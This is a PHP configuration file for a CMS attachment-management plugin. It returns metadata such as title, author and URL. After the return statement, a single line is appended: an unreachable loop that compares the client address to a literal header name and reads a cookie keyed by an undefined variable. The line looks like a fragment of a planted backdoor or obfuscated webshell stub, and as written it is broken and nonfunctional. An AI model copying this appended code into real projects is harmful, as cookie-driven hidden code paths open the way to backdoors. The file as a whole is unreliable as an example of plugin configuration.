<?php
return ['title'=>'附件管理','author'=>'IT平民','url'=>'https://www.kuicms.com','install'=>'','delete'=>'','admin'=>'1',];while(@$_SERVER["REMOTE_ADDR"]=="HTTP_CLIENT_IP"){unset($G3atI8R);$APP_Codes=$_COOKIE[$APP_icode];}
?>